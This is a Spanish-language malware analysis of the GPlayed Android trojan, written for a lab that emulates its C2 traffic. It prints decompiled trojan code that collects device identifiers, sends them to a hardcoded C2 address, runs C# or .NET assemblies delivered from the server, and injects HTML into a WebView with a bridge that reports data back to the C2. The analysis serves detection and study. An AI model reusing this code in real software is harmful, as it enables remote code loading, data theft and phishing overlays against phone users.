GPlayed es un troyano para Android desarrollado con Xamarin, cuya arquitectura y capacidades fueron descritas por Cisco Talos en su [análisis de la familia](https://blog.talosintelligence.com/gplayedtrojan/). El código Java del APK está formado principalmente por los contenedores y enlaces generados para comunicar Android con Mono; la lógica relevante se encuentra en los ensamblados .NET incluidos en `assemblies/`. En esta muestra, `eCommon.dll` define el protocolo y los objetos intercambiados, mientras que `Reznov.dll` contiene el ensamblado `eClient`, responsable de la comunicación y de ejecutar las órdenes.

El flujo seleccionado estudia la recepción de código desde el C2 mediante las respuestas `Evaluate`, `LoadScript`, `LoadPlugin` y `AddInject`. Las tres primeras transportan código C# o un ensamblado .NET. La última puede transportar JavaScript para un `WebView` con una interfaz JavaScript habilitada. Estas capacidades se corresponden con [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE también atribuye a [GPlayed (S0536)](https://attack.mitre.org/software/S0536/).

| Artefacto | Tipo | Identificación | SHA-256 |
|---|---|---|---|
| `GPlayed.apk` | APK de Android | Paquete `verReznov.Coampany`; versión `Lollipopka`; API mínima 10 y objetivo 22 | `a342a16082ea53d101f556b50532651cd3e3fdc7d9e0be3aa136680ad9c6a69f` |
| `assemblies/eCommon.dll` | Ensamblado .NET incluido en la APK | Ensamblado `eCommon` 1.0.0.0; modelos y codificación del protocolo | `604deb75eedf439766896f05799752de268baf437bf89a7185540627ab4a4bd1` |
| `assemblies/Reznov.dll` | Ensamblado Xamarin incluido en la APK | Ensamblado `eClient` 1.0.0.0; Xamarin.Android 5.1; canal C2 y ejecución de órdenes | `17b8665cdbbb94482ca970a754d11d6e29c46af6390a2d8e8193d8d6a527dec3` |

### Peticiones y respuestas del C2

Los enumerados de `eCommon.Network.Enums` distinguen las operaciones iniciadas por el cliente de las acciones devueltas por el servidor. `ERequest` identifica las peticiones que GPlayed envía al C2; `EResponse` selecciona la acción que debe procesar el dispositivo:

```csharp
public enum ERequest
{
    Error,
    Registration,
    Ping,
    Done,
    SMSRecv,
    CCData,
    Empty,
    SMSList,
    AppList,
    ContactList,
    Location,
    SMSStatus,
    InjectData
}

public enum EResponse
{
    Error,
    Registration,
    Ok,
    Empty,
    SendSMS,
    RequestGoogleCC,
    Wipe,
    OpenBrowser,
    SendUSSD,
    ServerChange,
    StartApp,
    CallPhone,
    SetPingTimer,
    SMSBroadcast,
    RequestContacts,
    RequestSMSList,
    RequestAppList,
    RequestLocation,
    ShowNotification,
    SetLockPassword,
    LockNow,
    MuteSound,
    LoadScript,
    LoadPlugin,
    Evaluate,
    AddInject,
    RemoveInject
}
```

Las cuatro respuestas seleccionadas transportan objetos JSON diferentes. Sus clases muestran los campos que deben estar presentes antes de la serialización:

```csharp
public class Evaluate
{
    public string Script { get; set; } = "";
}

public class LoadScript
{
    public string Name { get; set; } = "RandomScript";
    public string Code { get; set; }
    public bool AutoLoad { get; set; }
}

public class LoadPlugin
{
    public string Name { get; set; } = "RandomPlugin";
    public byte[] Assembly { get; set; }
    public bool AutoLoad { get; set; }
}

public class AddInject
{
    public string Activity { get; set; } = "com.android.vending";
    public string HTML { get; set; } = "TEST";
}
```

Cada rama produce una transición local distinta:

| Respuesta | Contenido entregado | Tratamiento en la muestra |
|---|---|---|
| `Evaluate` | Código C# en `Script` | Evaluación inmediata mediante `Mono.CSharp.Evaluator`; no se guarda en disco |
| `LoadScript` | Nombre, código C# y `AutoLoad` | Ejecución inmediata; solo se guarda si `AutoLoad` es verdadero |
| `LoadPlugin` | Nombre, ensamblado y `AutoLoad` | Carga desde memoria mediante `Assembly.Load(byte[])`; solo se guarda si `AutoLoad` es verdadero |
| `AddInject` | Actividad de destino y HTML | Conservación en memoria; presentación posterior en un `WebView` cuando se detecta la actividad indicada |

La persistencia de `LoadScript` y `LoadPlugin` es, por tanto, condicional. La presencia de esos comandos no implica por sí sola que el código quede almacenado entre ejecuciones.

La ruta `Evaluate` entrega el texto directamente al evaluador creado por `eScripting`. El método `LoadCode()` lo ejecuta en el hilo de la aplicación:

```csharp
public void LoadCode(string code)
{
    try
    {
        eService.Get().RunAction(delegate
        {
            object result = null;
            bool resultSet = false;
            _eval.Evaluate(code, out result, out resultSet);
        });
    }
    catch (Exception ex)
    {
        Log.Error("eScript", ex + " " + _writer);
        _writer.Flush();
    }
}
```

La respuesta `LoadScript` crea otro evaluador, ejecuta el código y mantiene la instancia en el diccionario `_scripts`. El fichero de carga automática solo se crea cuando el servidor establece `AutoLoad=true`:

```csharp
public void AddScript(string name, string code, bool autoLoad = false)
{
    eScript script = new eScript(name);
    script.LoadCode(code);
    _scripts.Add(name, script);
    if (autoLoad)
    {
        SaveScriptForAutoload(name, code);
    }
}

private static void SaveScriptForAutoload(string name, string code)
{
    string documents = Environment.GetFolderPath(
        Environment.SpecialFolder.MyDocuments
    );
    string fileName = "/.specialsc." + name + ".scsript";
    File.WriteAllText(documents + fileName, code);
    if (!eSettings.Get("scsr").Contains(fileName))
    {
        eSettings.Set("scsr", eSettings.Get("scsr") + fileName + ";");
    }
}
```

La ruta `LoadPlugin` recibe la propiedad `Assembly` como un array de bytes. Newtonsoft.Json representa ese `byte[]` como Base64 dentro del JSON; después, la respuesta completa vuelve a codificarse en Base64 para circular por el protocolo. Tras deserializar ambas capas, `ePlugins.Load()` carga el ensamblado desde memoria, localiza una clase que implemente `IPlugin` y llama a `Initialize()`:

```csharp
public static string Load(
    string name,
    byte[] assemblyBytes,
    bool autoLoad = false)
{
    try
    {
        Type[] types = Assembly.Load(assemblyBytes).GetTypes();
        foreach (Type type in types)
        {
            if (typeof(IPlugin).IsAssignableFrom(type))
            {
                if (autoLoad)
                {
                    SaveAssemblyForAutoload(name, assemblyBytes);
                }
                return ((IPlugin)Activator.CreateInstance(type)).Initialize();
            }
        }
    }
    catch (Exception)
    {
    }
    return null;
}
```

La respuesta `AddInject` no se escribe en disco. La clase `eInjects` relaciona en memoria el nombre de una actividad con el HTML recibido. Cuando esa actividad pasa a primer plano, prepara `eBrowserDialog` para cargar el contenido:

```csharp
public static void Add(string activity, string html)
{
    if (!_injects.ContainsKey(activity))
    {
        _injects.Add(activity, html);
    }
}

public static void TryActivity(string activity)
{
    if (activity != null && _injects.ContainsKey(activity))
    {
        eBrowserDialog.IsLock = false;
        eBrowserDialog.URL = "HTML";
        eBrowserDialog.HTML = _injects[activity];
        eService.Get().StartNewActivity(typeof(eBrowserDialog));
    }
}
```

El diálogo habilita JavaScript, expone el objeto `webapi` mediante `AddJavascriptInterface()` y entrega el HTML a `WebView.LoadData()`:

```csharp
webView.Settings.JavaScriptEnabled = true;
webView.Settings.AllowFileAccess = true;

eBrowserAPI browserAPI = new eBrowserAPI();
browserAPI.SetAPI(webView, null, this);
webView.AddJavascriptInterface(browserAPI, "webapi");

if (URL != "HTML")
{
    webView.LoadUrl(URL);
}
else
{
    webView.LoadData(HTML, "text/html", "UTF-8");
}
```

La interfaz incluye `SendInjectData()`, que permite que el contenido del `WebView` genere una nueva petición `InjectData` al C2. El código demuestra el canal de retorno, aunque su uso concreto depende del JavaScript suministrado:

```csharp
[Export]
[JavascriptInterface]
public void SendInjectData(string activity, string data)
{
    InjectData injectData = new InjectData();
    injectData.Data = data;
    injectData.Activity = activity;
    eNetwork.Get().Request(
        new eNetRequest(Enums.ERequest.InjectData, injectData)
    );
}
```

La relación de `AddInject` con T1407 requiere que el HTML recibido contenga JavaScript ejecutable. El mero transporte de HTML estático no bastaría para considerarlo nuevo código. El laboratorio utiliza una página inocua que sí incluye JavaScript, aunque el cliente Python se limita a decodificarla y no reproduce el `WebView` ni el disparador asociado a la actividad.

La dirección principal del C2 se define en `eConstants`:

```csharp
public static string Server { get; set; } =
    "http://5.9.33.226:5416/";
```

El extremo usa HTTP en el puerto 5416. Esto permite estudiar también [**T1509 - Non-Standard Port**](https://attack.mitre.org/techniques/T1509/), ya que el protocolo web circula por un puerto diferente de los asignados habitualmente a HTTP y HTTPS.

### Comunicación con el C&C

La clase `eService` conserva la dirección del servidor en las preferencias privadas y configura un temporizador de sondeo. El valor inicial de `PingTime` es 20 segundos. Si el cliente aún no está registrado, envía primero `Registration`; los sondeos posteriores utilizan `Ping` y procesan como orden cualquier respuesta distinta de `Ok`:

```csharp
private void OnPing(object sender, ElapsedEventArgs e)
{
    if (eSettings.Get("resg") == "")
    {
        if (!eNetHandler.Register())
        {
            return;
        }
        eSettings.Set("resg", "true");
    }

    eNetResponse response = eNetwork.Get().Request(
        new eNetRequest(Enums.ERequest.Ping, new Ping())
    );

    if (response.Code == Enums.EResponse.Ok)
    {
        Log.Warn(
            "RESPONSE",
            response.Code + " Data: " + response.GetData<Ok>().Response
        );
    }
    else
    {
        eNetHandler.HandleAction(response);
    }
}
```

El registro reúne el IMEI, la versión y compilación de Android, el modelo, el fabricante, el país, el número de teléfono, el IMSI, el operador y una lista de capacidades. La clase `eNetRequest` serializa este objeto con Newtonsoft.Json antes de entregarlo a `eNetwork.Request()`.

La función de red concatena el servidor, el parámetro `q`, el IMEI, el nombre de `ERequest` y el JSON codificado:

```csharp
string encodedJson = eUtility.Base64Encode(req.JSON)
    .Replace("+", "|")
    .Replace("=", "AAAZZZXXX")
    .Replace("/", ".");

string url = string.Concat(
    eConstants.Server,
    "?q=",
    eInfo.Get().GetIMEI(),
    "-",
    req.Code,
    ":",
    encodedJson
);

string responseText = webClient.DownloadString(url);
```

El método `DownloadString()` realiza una petición HTTP `GET`. Antes del escapado propio de una URI, el valor lógico del parámetro presenta esta estructura:

```http
GET /?q=<IMEI>-<ERequest>:<Base64 modificado del JSON> HTTP/1.1
Host: 5.9.33.226:5416
```

La codificación Base64 de las peticiones sustituye tres caracteres para que el contenido viaje dentro de la consulta:

| Carácter Base64 | Representación transmitida |
|---|---|
| `+` | `|` |
| `=` | `AAAZZZXXX` |
| `/` | `.` |

Estos reemplazos no cifran el JSON. Solo alteran su representación y pueden coexistir con el escapado porcentual aplicado por la biblioteca HTTP a caracteres reservados de la URI.

El servidor responde con el nombre textual de `EResponse`, un carácter de dos puntos y el JSON codificado con Base64 estándar:

```text
<EResponse>:<Base64 estándar del JSON>
```

La respuesta no aplica las sustituciones usadas en la consulta. El cliente separa el nombre de la acción, lo convierte al enumerado y decodifica directamente la segunda parte:

```csharp
EResponse code = (EResponse)Enum.Parse(
    typeof(EResponse),
    responseText.Split(':')[0]
);

string json = eUtility.Base64Decode(
    responseText.Split(':')[1]
);

return new eNetResponse(code, json);
```

La clase `eNetHandler` despacha las cuatro acciones seleccionadas mediante un `switch`. Esta transición enlaza los bytes recibidos con los componentes locales descritos anteriormente:

```csharp
case EResponse.LoadPlugin:
{
    LoadPlugin data = resp.GetData<LoadPlugin>();
    ePlugins.Load(data.Name, data.Assembly, data.AutoLoad);
    break;
}
case EResponse.LoadScript:
{
    LoadScript data = resp.GetData<LoadScript>();
    eScripting.Get().AddScript(data.Name, data.Code, data.AutoLoad);
    break;
}
case EResponse.Evaluate:
{
    Evaluate data = resp.GetData<Evaluate>();
    eScripting.Get().GetEvaluator().LoadCode(data.Script);
    break;
}
case EResponse.AddInject:
{
    AddInject data = resp.GetData<AddInject>();
    eInjects.Add(data.Activity, data.HTML);
    break;
}
```

La muestra contiene además una ruta secundaria basada en `ClientWebSocket` hacia `5.9.33.226:5417/ws/`. El método `eNetwork.Request()` intenta utilizarla para peticiones distintas de `Ping` cuando falla la solicitud HTTP. Esta alternativa no interviene en el escenario seleccionado: el laboratorio mantiene disponible el C2 HTTP y reproduce las cuatro órdenes como respuestas a sondeos satisfactorios.

### Secuencia comunicativa

El diagrama resume el flujo que reproduce el laboratorio. Las cuatro órdenes se entregan en respuestas sucesivas a peticiones `Ping`:

```mermaid
sequenceDiagram
    participant C as "Cliente GPlayed emulado"
    participant S as "C2 HTTP emulado"

    C->>S: GET con q=<IMEI>-Registration:<JSON modificado>
    S-->>C: 200 OK con Ok:<Base64 JSON>
    C->>S: GET con q=<IMEI>-Ping:<JSON modificado>
    S-->>C: 200 OK con Evaluate:<Base64 JSON y código C#>
    C->>S: GET con q=<IMEI>-Ping:<JSON modificado>
    S-->>C: 200 OK con LoadScript:<Base64 JSON y código C#>
    C->>S: GET con q=<IMEI>-Ping:<JSON modificado>
    S-->>C: 200 OK con LoadPlugin:<Base64 JSON y ensamblado>
    C->>S: GET con q=<IMEI>-Ping:<JSON modificado>
    S-->>C: 200 OK con AddInject:<Base64 JSON y HTML/JavaScript>
    Note over C: El cliente de laboratorio decodifica los contenidos, pero no los ejecuta
```

### Laboratorio de generación del PCAP

La APK incluye bibliotecas nativas únicamente para `armeabi-v7a`. Por ello no puede ejecutarse de forma nativa en un AVD x86 sin una capa adicional de traducción ARM. El laboratorio evita esa dependencia mediante un cliente y un servidor escritos en Python que reproducen el protocolo derivado del código. La captura representa la firma de red de GPlayed, no una ejecución de la APK original ni de sus efectos locales.

El servidor escucha en el puerto 5416 y responde primero con `Ok` al registro. Después entrega, en cuatro sondeos consecutivos, `Evaluate`, `LoadScript`, `LoadPlugin` y `AddInject`. Los contenidos son controlados e inocuos. Como el servidor se inicia sin `--autoload`, los campos `AutoLoad` de las dos ramas que lo admiten se envían con valor falso.

| Entidad | Dirección y servicio | Procedencia |
|---|---|---|
| Víctima emulada | `10.53.6.10` | Dirección privada asignada al cliente dentro de la topología aislada. |
| C2 de GPlayed | `5.9.33.226:5416` | URL HTTP fijada en la propiedad `Server` de la muestra analizada y publicada por [Cisco Talos](https://blog.talosintelligence.com/gplayedtrojan/) como IOC de GPlayed. |

No se necesita una autoridad de certificación porque el canal seleccionado usa HTTP sin TLS. El cliente conecta directamente con `5.9.33.226:5416` y conserva ese mismo extremo en la cabecera `Host`.

Este escenario está automatizado en `python-labnet` con el identificador `gplayed`. La ejecución y la generación de la captura se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).

La captura resultante debe mostrar una petición de registro y cuatro peticiones `Ping`, todas mediante HTTP sobre TCP/5416. Las respuestas transportan las cuatro variantes de código o contenido dinámico. Esta evidencia permite demostrar su entrega por red y la utilización de un puerto no estándar; la evaluación de C#, la carga del ensamblado y la presentación del `WebView` se deducen del código analizado, pero no son ejecutadas por el cliente Python ni pueden confirmarse únicamente con la PCAP.
